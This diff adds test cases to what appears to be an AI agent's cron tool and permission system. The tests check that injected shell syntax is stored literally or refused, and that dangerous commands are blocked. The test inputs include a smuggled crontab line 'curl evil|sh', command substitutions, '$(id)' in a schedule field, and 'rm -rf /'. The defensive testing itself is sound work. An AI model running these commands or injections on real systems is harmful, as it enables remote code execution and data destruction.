@@ -119,3 +119,56 @@ describe('ftp_upload', () => {
     expect(fs.existsSync(path.join(dir, 'argv'))).toBe(false);
   });
 });
+
+describe('cron', () => {
+  const fakeCrontab = () => {
+    const bin = path.join(dir, 'bin');
+    fs.mkdirSync(bin, { recursive: true });
+    // -l prints the saved table (or fails like the real one); - saves stdin
+    fs.writeFileSync(path.join(bin, 'crontab'),
+      `#!/bin/sh\nif [ "$1" = "-l" ]; then cat "${dir}/tab" 2>/dev/null || exit 1; else cat > "${dir}/tab"; fi\n`, { mode: 0o755 });
+    vi.stubEnv('PATH', `${bin}:${process.env.PATH}`);
+  };
+
+  it('saves $(…) and backticks literally instead of running them', async () => {
+    const { cronTool } = await import('../../src/tools/cron.js');
+    fakeCrontab();
+    const canary = path.join(dir, 'pwned');
+    const cmd = `echo "$(touch ${canary})" \`touch ${canary}\``;
+    const out = await cronTool({ action: 'add', schedule: 'daily', command: cmd, label: 'x' });
+    expect(out).toMatch(/Cron job added/);
+    expect(fs.existsSync(canary)).toBe(false);
+    expect(fs.readFileSync(path.join(dir, 'tab'), 'utf8')).toContain(cmd);
+  });
+
+  it('refuses a command or label that would add extra crontab lines', async () => {
+    const { cronTool } = await import('../../src/tools/cron.js');
+    fakeCrontab();
+    expect(await cronTool({ action: 'add', schedule: 'daily', command: 'true\n* * * * * curl evil|sh' })).toMatch(/single line/);
+    expect(await cronTool({ action: 'add', schedule: 'daily', command: 'true', label: 'a\nb' })).toMatch(/label/);
+    expect(await cronTool({ action: 'add', schedule: '* * * * $(id)', command: 'true' })).toMatch(/Invalid schedule/);
+    expect(fs.existsSync(path.join(dir, 'tab'))).toBe(false);
+  });
+});
+
+describe('permissions: shell-running tools are all screened', () => {
+  it('cron run/add get the same dangerous-command block as run_shell', async () => {
+    const { PermissionSystem, shellCommandOf } = await import('../../src/safety/permissions.js');
+    const bad = 'rm -rf /';
+    for (const level of ['auto', 'normal'] as const) {
+      const p = new PermissionSystem(level);
+      expect(p.check('run_shell', { command: bad }).allowed).toBe(false);
+      expect(p.check('cron', { action: 'run', command: bad }).allowed).toBe(false);
+      expect(p.check('cron', { action: 'add', schedule: 'daily', command: bad }).allowed).toBe(false);
+      expect(p.check('cron', { action: 'list' }).allowed).toBe(true);
+    }
+    expect(shellCommandOf('cron', { action: 'list' })).toBeNull();
+  });
+
+  it('in normal mode a new cron job always asks first', async () => {
+    const { PermissionSystem } = await import('../../src/safety/permissions.js');
+    const p = new PermissionSystem('normal');
+    expect(p.check('cron', { action: 'add', schedule: 'daily', command: 'ls' }).needsConfirm).toBe(true);
+    expect(p.check('run_shell', { command: 'ls' }).needsConfirm).toBeFalsy();
+  });
+});
